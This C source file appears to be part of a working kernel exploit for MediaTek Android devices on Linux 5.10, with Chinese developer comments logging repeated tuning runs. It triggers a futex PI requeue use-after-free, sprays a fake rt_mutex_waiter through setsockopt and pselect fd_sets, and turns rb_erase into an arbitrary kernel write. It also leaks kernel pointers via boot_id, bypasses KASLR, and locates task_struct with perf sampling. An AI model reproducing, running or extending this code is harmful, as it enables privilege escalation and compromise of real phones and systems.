#include "common.h"
#include <netinet/in.h>
#include <sys/socket.h>

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_WAIT_SECONDS 30

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_owner_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static int pselect_slide_shift = 0;  /* mt19: runtime shift (PSELECT_SHIFT) */

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return pselect_slide_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  /* mt19: env overrides (same scheme as the FOPS route) */
  char *pc_env = getenv("PSELECT_TREE_PC");
  char *left_env = getenv("PSELECT_TREE_LEFT");
  char *right_env = getenv("PSELECT_TREE_RIGHT");
  uint64_t tree_pc = pc_env ? strtoull(pc_env, NULL, 16) : SLIDE_LOGGERS_0_1;
  uint64_t tree_left = left_env ? strtoull(left_env, NULL, 16)
                                : SLIDE_RANDOM_BOOT_ID_DATA;
  /* mt24: tree_right 默认 = fake_lock (映射喷页地址) — JoinChang "write-1":
   * 写入值 = 该地址 (低字节可控) + rb_set_parent(child) 写到喷页 (无害) */
  uint64_t tree_right = right_env ? strtoull(right_env, NULL, 16) : fake_lock;
  int probe = getenv("PSELECT_PROBE") != NULL;
  /* mt23b 探针: word6-9 填 0xCAFE.. 标记 (不碰 0-5 树字段 — Case 1 依赖 word1/2) */
  uint64_t w6 = SLIDE_INIT_TASK;
  /* mt28o: PSELECT_TREE_LOCK env → 静态锁 (0x77e0 零区: wait_lock=0,owner=0)
   * → 可完全跳过 ks/page prep (selinux 写 ~20s/轮) */
  char *lock_env = getenv("PSELECT_TREE_LOCK");
  uint64_t w7 = lock_env ? strtoull(lock_env, NULL, 16) : fake_lock;
  uint64_t w8 = FAKE_WAITER_PRIO;
  uint64_t w9 = 0;
  uint64_t w2 = tree_left;
  /* mt28d: pi_tree_entry words (word3-5) — rt_mutex_dequeue_pi 的
   * `child->__rb_parent_color = pc` → *word4 = word3 (任意值写!)
   * 默认 0 (leaf → 无副作用). */
  char *pi_pc_env = getenv("PSELECT_PI_PC");
  char *pi_right_env = getenv("PSELECT_PI_RIGHT");
  char *pi_left_env = getenv("PSELECT_PI_LEFT");
  uint64_t w3 = pi_pc_env ? strtoull(pi_pc_env, NULL, 16) : 0;
  uint64_t w4 = pi_right_env ? strtoull(pi_right_env, NULL, 16) : 0;
  uint64_t w5 = pi_left_env ? strtoull(pi_left_env, NULL, 16) : 0;
  char *shift_env = getenv("PSELECT_SHIFT");
  int pshift = shift_env ? atoi(shift_env) : 0;
  if (pshift < 0 || pshift > 20) {
    pshift = 0;
  }
  pselect_slide_shift = pshift;

  /* mt19: 5.10 flat 10-word rt_mutex_waiter layout (was 13-word 6.x table:
   * task@w10/lock@w11 → 5.10 需要 task@w6/lock@w7; 13-word 是 mt3/mt4 崩溃根因) */
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, tree_pc, "tree_pc"},
    {1, tree_right, "tree_right"},
    {2, w2, "tree_left"},
    {3, w3, "pi_parent"},
    {4, w4, "pi_right"},
    {5, w5, "pi_left"},
    {6, w6, "task"},
    {7, w7, "lock"},
    {8, w8, "prio"},
    {9, w9, "deadline"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  /* mt28o: 静态锁模式 (PSELECT_STATIC_LOCK=1) 跳过 page 依赖 — 无需 ks */
  if (!getenv("PSELECT_STATIC_LOCK")) {
    if (!page_base || !fake_lock || !fake_w0) {
      pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
               page_base, fake_lock, fake_w0);
      return;
    }
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    /* mt19b: try owner then waiter, up to 5 attempts; log every result */
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    long ret = -1;
    int saved_errno = 0;
    int best_ret = -1;
    int best_errno = 0;
    for (int a = 0; a < 5; a++) {
      int tid = (a % 2 == 0) ? atomic_load(&slide_waiter_tid)
                             : atomic_load(&slide_owner_tid);
      if (tid <= 0) {
        continue;
      }
      errno = 0;
      ret = sched_setattr_tid(tid, ((calls + a) % 19) + 1);
      saved_errno = errno;
      pr_info("mt19b: sched attempt=%d tid=%d ret=%ld errno=%d\n",
              a, tid, ret, saved_errno);
      fflush(stdout);
      if (ret == 0) {
        best_ret = 0;
        best_errno = 0;
        break;
      }
      if (best_ret != 0) {
        best_ret = (int)ret;
        best_errno = saved_errno;
      }
    }
    atomic_store(&slide_consume_last_sched_ret, best_ret);
    atomic_store(&slide_consume_last_sched_errno, best_errno);
    /* mt25: futex 触发加爆 — pselect 窗口内连发多发 (每次 50ms 阻塞 = 一次 walk 机会),
     * 间隔 20ms (JoinChang 循环思想; 原版只打一发, 命中率低) */
    int trig_hits = 0;
    for (int ti = 0; ti < 6; ti++) {
      struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
      errno = 0;
      long fret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
      pr_info("mt25: futex trigger %d ret=%ld errno=%d\n", ti, fret, errno);
      fflush(stdout);
      if (fret == 0) {
        futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        trig_hits++;
      }
      usleep(20000);
    }
    atomic_store(&slide_consume_sched_ok, trig_hits > 0);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* mt20: v37-style immediate stamp — replaces the pselect overlay.
 * setsockopt(MCAST_JOIN_SOURCE_GROUP, 512B) copies the fake waiter onto the
 * freed rt_waiter slot (v37-proven landing). buf[7]=fake_lock (SLIDE page:
 * wait_lock=0 → [5] passes, owner=0 → [6] passes + [9] clean-exits after [7]). */
static void slide_stamp_fake_waiter(void) {
  uint64_t buf[64];
  memset(buf, 0, sizeof(buf));
  char *pc_env = getenv("PSELECT_TREE_PC");
  uint64_t tree_pc = pc_env ? strtoull(pc_env, NULL, 16) : SLIDE_LOGGERS_0_1;
  buf[0] = tree_pc;          /* tree_entry.__rb_parent_color → rb_erase write target */
  buf[6] = SLIDE_INIT_TASK;  /* task */
  buf[7] = fake_lock;        /* lock — sprayed SLIDE fake lock (wait_lock=0, owner=0) */
  buf[8] = FAKE_WAITER_PRIO; /* prio */
  pr_info("mt20: stamp tree_pc=%016llx lock=%016llx task=%016llx\n",
          (unsigned long long)buf[0], (unsigned long long)buf[7],
          (unsigned long long)buf[6]);
  fflush(stdout);
  int fd = socket(AF_INET6, SOCK_DGRAM, 0);
  if (fd >= 0) {
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
    close(fd);
  }
  int p[2];
  if (pipe(p) == 0) {
    write(p[1], buf, sizeof(buf));
    close(p[0]);
    close(p[1]);
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  /* mt20: v37-style stamp; 或 mt19 pselect overlay (PSELECT_STAMP 未设时) */
  if (getenv("PSELECT_STAMP")) {
    slide_stamp_fake_waiter();
    atomic_store(&slide_consume_go, 1);
  } else {
    slide_pselect_stack_copy();
  }
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  atomic_store(&slide_owner_tid, (int)SYSCHK(syscall(SYS_gettid)));
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  /* ── MTK KASLR bypass: pselect side-channel fails on MTK scheduler.
   *     kallsyms confirms _text == KIMAGE_TEXT_BASE at runtime, slide=0.
   *     Still do one SLIDE page prep to warm up the kernel slab allocator
   *     before the FOPS page prep in run_exploit(). ── */

  /* mt16: PSELECT_SKIP_WARMUP=1 跳过 warmup (省一次重喷, slab 压力减半).
   * 原注释: warmup 对 MTK kernelsnitch 关键, 跳过可能失败 — 实测验证. */
  uintptr_t warmup_base = 0;
  int warmup_ok = 0;
  if (!getenv("PSELECT_SKIP_WARMUP")) {
    warmup_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    warmup_ok = (warmup_base != 0);
  } else {
    pr_info("mt16: skipping SLIDE warmup per PSELECT_SKIP_WARMUP\n");
  }
  if (warmup_ok) {
    cleanup_page_prepare_state();
  }

  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_slide = 0;
  kaslr_done = 1;
  pr_success("slide-kaslr-mtk-hardcoded pid=%d base=%016llx slide=%016llx "
             "warmup=%d\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, warmup_ok);
  return 1;
}

/* ═══════════════════════════════════════════════════════════════════════
 * mt21: v37 拓扑移植 — futex1/futex2/cycle_futex + FLPI 触发 + fake_lock stamp
 * (waiter 只拥有 cycle_futex → 检查 D 稳定通过; prio=130≠120 → [3]-E 通过)
 * ═══════════════════════════════════════════════════════════════════════ */
static uint32_t v37_futex1 = 0, v37_futex2 = 0, v37_cycle = 0;
static volatile int v37_o_ready = 0, v37_w_ready = 0, v37_o_blocking = 0;
static volatile int v37_w_waiting = 0, v37_uaf_probe = 0;

static long v37_xfutex(uint32_t *u, int op, uint32_t val, void *ts,
                       uint32_t *u2, uint32_t v3) {
  return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

/* v37 同款 stamp: setsockopt 512B 立即落到释放槽 */
static void v37_stamp(void) {
  uint64_t buf[64];
  memset(buf, 0, sizeof(buf));
  char *pc_env = getenv("PSELECT_TREE_PC");
  uint64_t tree_pc = pc_env ? strtoull(pc_env, NULL, 16) : SLIDE_LOGGERS_0_1;
  buf[0] = tree_pc;
  char *task_env = getenv("PSELECT_TREE_TASK");
  buf[6] = task_env ? strtoull(task_env, NULL, 16) : SLIDE_INIT_TASK;
  char *lock_env = getenv("PSELECT_TREE_LOCK");
  buf[7] = lock_env ? strtoull(lock_env, NULL, 16) : fake_lock;
  /* SLIDE 假锁: wait_lock=0 → [5]过, owner=0 → [6]过+[9]干净退出 */
  buf[8] = FAKE_WAITER_PRIO; /* 130 ≠ 120 (任务默认prio) → [3]-E 不退出 */
  pr_info("mt21: stamp tree_pc=%016llx lock=%016llx\n",
          (unsigned long long)buf[0], (unsigned long long)buf[7]);
  fflush(stdout);
  int fd = socket(AF_INET6, SOCK_DGRAM, 0);
  if (fd >= 0) {
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
    close(fd);
  }
  int p[2];
  if (pipe(p) == 0) {
    write(p[1], buf, sizeof(buf));
    close(p[0]);
    close(p[1]);
  }
}

static void *v37_owner_fn(void *u __attribute__((unused))) {
  v37_futex2 = (uint32_t)syscall(SYS_gettid);
  v37_o_ready = 1;
  while (!v37_w_ready) sched_yield();
  v37_o_blocking = 1;
  v37_xfutex(&v37_cycle, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  v37_xfutex(&v37_cycle, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  return NULL;
}

static void *v37_waiter_fn(void *u __attribute__((unused))) {
  struct timespec ts;
  while (!v37_o_ready) sched_yield();
  v37_cycle = (uint32_t)syscall(SYS_gettid);
  v37_w_ready = 1;
  while (!v37_o_blocking) sched_yield();
  usleep(20000);
  v37_w_waiting = 1;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_sec += 2;
  v37_xfutex(&v37_futex1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0,
             &ts, &v37_futex2, 0);
  /* mt21: FWRQ 返回后立即 stamp (v37 顺序, 无中间 syscall) */
  v37_stamp();
  v37_uaf_probe = 1;
  usleep(500000);
  v37_xfutex(&v37_cycle, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  return NULL;
}

/* 返回: 0 = 未写; 1 = boot_id 已变 (写原语实证) */
int slide_v37_trigger(void) {
  pthread_t oth, wth;
  pr_info("mt21: v37 topology trigger (cycle/futex1/futex2)\n");
  fflush(stdout);
  pthread_create(&oth, NULL, v37_owner_fn, NULL);
  pthread_create(&wth, NULL, v37_waiter_fn, NULL);
  while (!v37_w_waiting) sched_yield();
  usleep(40000);
  errno = 0;
  long ret = v37_xfutex(&v37_futex1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                        1, (void *)(uintptr_t)1, &v37_futex2, 0);
  int err = errno;
  pr_info("mt21: FCRQ ret=%ld errno=%d\n", ret, err);
  fflush(stdout);
  if (ret == -1 && err == EDEADLK) {
    while (!v37_uaf_probe) sched_yield();
    pr_info("mt21: UAF probe FLPI(cycle)...\n");
    fflush(stdout);
    errno = 0;
    long lr = v37_xfutex(&v37_cycle, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                         0, NULL, NULL, 0);
    pr_info("mt21: FLPI ret=%ld errno=%d\n", lr, errno);
    fflush(stdout);
    v37_xfutex(&v37_cycle, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  }
  pthread_join(wth, NULL);
  pthread_join(oth, NULL);
  return 0;
}

/* mt22: 重置 slide 触发状态 (attempts 之间) */
void slide_reset_trigger_state(void) {
  slide_f_wait = 0;
  slide_f_pi_target = 0;
  slide_f_pi_chain = 0;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
}

/* ── mt28c: perf_find_task — JoinChang 移植 (shell 上下文, Permissive 下可用)
 * perf_event_open 采样本进程 syscall 时各寄存器里的内核地址,
 * 出现最多的候选 = 当前线程的 task_struct (slab 直映射地址). */
#include <linux/perf_event.h>
uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("mt28c: perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("mt28c: perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(SYS_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256];
  int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p;
      p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xffffff9000000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  if (!nc) {
    pr_warning("mt28c: perf no kernel candidates\n");
    return 0;
  }
  uintptr_t best = 0;
  int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++)
      if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) {
      best_cnt = cnt;
      best = cands[i];
    }
  }
  pr_info("mt28c: perf task=0x%016zx (%d/%d votes)\n", (size_t)best, best_cnt, nc);
  return best;
}

/* mt22: 读原始 boot_id 前 8 字节 (u64, little-endian) 用于写验证 */
uint64_t slide_read_boot_id(void) {
  char buf[64];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n < 0) return 0;
  buf[n] = 0;
  uint64_t out = 0;
  int nibble = -1, outb = 0;
  for (ssize_t i = 0; i < n && outb < 8; i++) {
    int v = -1;
    char c = buf[i];
    if (c >= '0' && c <= '9') v = c - '0';
    else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
    else if (c >= 'A' && c <= 'F') v = c - 'A' + 10;
    if (v < 0) continue;
    if (nibble < 0) { nibble = v; continue; }
    out |= ((uint64_t)((nibble << 4) | v)) << (outb * 8);
    outb++;
    nibble = -1;
  }
  return out;
}

/* ═══════════════════════════════════════════════════════════════════════
 * mt23: 写形状校准
 * 目标: 控制 rb_erase 写入的值 (Case 1: parent->rb_right = child, child = fd_set
 * word1) + 目标地址 (tree_pc = PSELECT_TREE_PC)。默认写 0 到目标。
 * JoinChang "write-1" 模式: word1 = 指针值, 其低字节编码目标字节。
 * 另加 geometry 探针: word0-9 全填 0xCAFE.. 标记, 事后回读 boot_id 看哪些字
 * 实际落在目标区 (校准偏移)。
 * ═══════════════════════════════════════════════════════════════════════ */
static void mt23_probe_stamp(void) {
  uint64_t buf[64];
  memset(buf, 0, sizeof(buf));
  char *pc_env = getenv("PSELECT_TREE_PC");
  char *right_env = getenv("PSELECT_TREE_RIGHT");
  uint64_t tree_pc = pc_env ? strtoull(pc_env, NULL, 16) : SLIDE_LOGGERS_0_1;
  /* mt24: tree_right 默认 = fake_lock (映射喷页地址) — JoinChang "write-1":
   * 写入值 = 该地址 (低字节可控) + rb_set_parent(child) 写到喷页 (无害) */
  uint64_t tree_right = right_env ? strtoull(right_env, NULL, 16) : fake_lock;
  buf[0] = tree_pc;          /* 写目标 (parent) */
  buf[1] = tree_right;       /* Case 1: 写入的值 */
  /* geometry 探针: 各字填不同标记, 供事后比对 boot_id 区落点 */
  buf[2] = 0xCAFE000000000002ULL;
  buf[3] = 0xCAFE000000000003ULL;
  buf[4] = 0xCAFE000000000004ULL;
  buf[5] = 0xCAFE000000000005ULL;
  buf[6] = SLIDE_INIT_TASK;
  buf[7] = fake_lock;
  buf[8] = FAKE_WAITER_PRIO;
  pr_info("mt23: probe tree_pc=%016llx right=%016llx\n",
          (unsigned long long)tree_pc, (unsigned long long)tree_right);
  fflush(stdout);
  int fd = socket(AF_INET6, SOCK_DGRAM, 0);
  if (fd >= 0) {
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
    close(fd);
  }
  int p[2];
  if (pipe(p) == 0) {
    write(p[1], buf, sizeof(buf));
    close(p[0]);
    close(p[1]);
  }
}
